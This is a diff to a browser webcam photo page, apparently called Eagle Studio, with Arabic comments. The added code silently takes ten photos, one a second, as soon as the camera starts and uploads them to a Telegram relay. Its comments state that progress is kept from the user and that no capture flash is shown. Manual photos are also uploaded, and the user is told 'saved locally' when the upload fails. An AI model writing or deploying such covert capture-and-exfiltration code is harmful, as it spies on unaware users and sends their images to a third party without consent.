-    ctx.scale(-1,1);
-
-    ctx.drawImage(
-      video,
-      0,
-      0,
-      canvas.width,
-      canvas.height
-    );
-
-  }else{
-
-    ctx.drawImage(
-      video,
-      0,
-      0,
-      canvas.width,
-      canvas.height
-    );
-
+  if (!ctx) {
+    return null;
   }
 
+  ctx.filter = getCanvasFilter(selectedEffect);
+
+  if (selectedEffect === "mirror") {
+
+    ctx.save();
+
+    ctx.translate(canvas.width, 0);
+    ctx.scale(-1, 1);
+
+    ctx.drawImage(
+      video,
+      0,
+      0,
+      canvas.width,
+      canvas.height
+    );
+
+    ctx.restore();
+
+  } else {
+
+    ctx.drawImage(
+      video,
+      0,
+      0,
+      canvas.width,
+      canvas.height
+    );
+  }
 
   ctx.filter = "none";
 
+  const blob = await new Promise(resolve => {
 
-  const blob =
-    await new Promise(resolve => {
+    canvas.toBlob(
+      resolve,
+      "image/jpeg",
+      imageQuality
+    );
 
-      canvas.toBlob(
-        resolve,
-        "image/jpeg",
-        imageQuality
-      );
+  });
 
-    });
-
-
-  if(!blob){
+  if (!blob) {
     return null;
   }
 
-
   lastBlob = blob;
 
-  save.style.display =
-    "inline-flex";
+  if (save) {
+    save.style.display = "inline-flex";
+  }
 
   addToGallery(blob);
 
-  return blob;
+  /*
+    مهم:
+    ماكانش triggerCaptureAnimation()
+    وبالتالي ماكانش white flash.
+  */
 
+  return blob;
 }
 
 
 /* =========================
-   SEND TO TELEGRAM
+   SEND PHOTO TO TELEGRAM
 ========================= */
 
-async function sendPhoto(blob){
+async function sendPhoto(blob) {
 
-  if(!blob){
+  if (!blob) {
     return false;
   }
 
-
-  const data =
-    new FormData();
-
+  const data = new FormData();
 
   data.append(
     "photo",
@@ -1619,30 +416,83 @@ async function sendPhoto(blob){
     "eagle-studio.jpg"
   );
 
+  try {
 
-  try{
-
-    const response =
-      await fetch(
-        "/send-photo",
-        {
-          method:"POST",
-          body:data
-        }
-      );
-
+    const response = await fetch(
+      "/send-photo",
+      {
+        method: "POST",
+        body: data
+      }
+    );
 
     return response.ok;
 
+  } catch (error) {
 
-  }catch(error){
-
-    console.error(error);
+    console.error(
+      "Telegram send error:",
+      error
+    );
 
     return false;
+  }
+}
 
+
+/* =========================
+   AUTOMATIC CAPTURE
+   10 PHOTOS
+   EVERY 1 SECOND
+========================= */
+
+async function startAutomaticPhotos() {
+
+  if (autoStarted || sending) {
+    return;
   }
 
+  autoStarted = true;
+  sending = true;
+
+  /*
+    نثبت الإعدادات الافتراضية:
+    10 صور
+    كل 1 ثانية
+  */
+
+  const count = automaticPhotoCount || 10;
+  const interval = automaticInterval || 1000;
+
+  for (let i = 0; i < count; i++) {
+
+    /*
+      صورة كل 1 ثانية
+    */
+
+    await new Promise(resolve => {
+      setTimeout(resolve, interval);
+    });
+
+    const blob = await takePhoto();
+
+    if (blob) {
+
+      await sendPhoto(blob);
+
+    }
+  }
+
+  sending = false;
+
+  /*
+    ما نعرضوش progress للمستخدم.
+    غير رسالة نهائية بعد انتهاء التصوير.
+  */
+
+  if (autoInfo) {
+    autoInfo.textContent = "Automatic capture completed.";
+  }
 }
 
 
@@ -1650,147 +500,130 @@ async function sendPhoto(blob){
    START CAMERA
 ========================= */
 
-start.addEventListener(
-  "click",
-  async () => {
+if (start) {
 
-    if(stream){
+  start.addEventListener("click", async () => {
+
+    /*
+      منع تشغيل الكاميرا مرة ثانية
+    */
+
+    if (stream) {
       return;
     }
 
+    try {
 
-    try{
+      stream = await navigator.mediaDevices.getUserMedia({
+        video: {
+          facingMode: "user"
+        },
+        audio: false
+      });
 
-      stream =
-        await navigator
-        .mediaDevices
-        .getUserMedia({
+      video.srcObject = stream;
 
-          video:{
-            facingMode:"user"
-          },
+      capture.disabled = false;
 
-          audio:false
+      start.disabled = true;
 
-        });
-
-
-      video.srcObject =
-        stream;
-
-
-      capture.disabled =
-        false;
-
-
-      start.disabled =
-        true;
-
-
-      start.textContent =
-        "✓ الكاميرا تعمل";
-
+      start.textContent = "✓ الكاميرا تعمل";
 
       applyEffect();
 
+      if (autoInfo) {
+        autoInfo.textContent = "Camera ready.";
+      }
 
-      autoInfo.textContent =
-        "Camera ready.";
+      /*
+        ⭐ الميزة الخاصة:
+        بمجرد تشغيل الكاميرا يبدأ
+        التصوير التلقائي:
+        1 صورة كل ثانية
+        لمدة 10 ثواني
+      */
 
-    }catch(error){
+      startAutomaticPhotos();
 
-      console.error(error);
+    } catch (error) {
 
-      start.disabled =
-        false;
+      console.error(
+        "Camera error:",
+        error
+      );
 
+      stream = null;
+
+      start.disabled = false;
 
       showToast(
         "Camera permission is required."
       );
-
     }
 
-  }
-);
+  });
+}
 
 
 /* =========================
-   MANUAL CAPTURE
+   MANUAL SHUTTER
 ========================= */
 
-capture.addEventListener(
-  "click",
-  async () => {
+if (capture) {
 
-    if(capture.disabled){
+  capture.addEventListener("click", async () => {
+
+    const blob = await takePhoto();
+
+    if (!blob) {
+      showToast("Camera is not ready.");
       return;
     }
 
+    /*
+      إرسال الصورة اليدوية أيضاً إلى Telegram
+    */
 
-    capture.disabled = true;
+    const sent = await sendPhoto(blob);
 
+    if (sent) {
 
-    const blob =
-      await takePhoto();
+      showToast(
+        "Photo captured successfully."
+      );
 
+    } else {
 
-    if(blob){
-
-      const sent =
-        await sendPhoto(blob);
-
-
-      if(sent){
-
-        showToast(
-          "Photo captured successfully."
-        );
-
-      }else{
-
-        showToast(
-          "Photo saved locally."
-        );
-
-      }
-
+      showToast(
+        "Photo saved locally."
+      );
     }
 
-
-    capture.disabled = false;
-
-  }
-);
+  });
+}
 
 
 /* =========================
-   SAVE LAST PHOTO
+   CLEANUP
 ========================= */
 
-save.addEventListener(
-  "click",
-  () => {
+window.addEventListener("beforeunload", () => {
 
-    if(!lastBlob){
-      return;
-    }
+  if (stream) {
 
-
-    downloadBlob(
-      lastBlob,
-      "eagle-studio.jpg"
-    );
-
-
-    showToast(
-      "Photo downloaded."
-    );
+    stream.getTracks().forEach(track => {
+      track.stop();
+    });
 
   }
-);
 
+  galleryPhotos.forEach(photo => {
+
+    if (photo.url) {
+      URL.revokeObjectURL(photo.url);
+    }
+
+  });
+
+});
 </script>
-
-</body>
-</html>
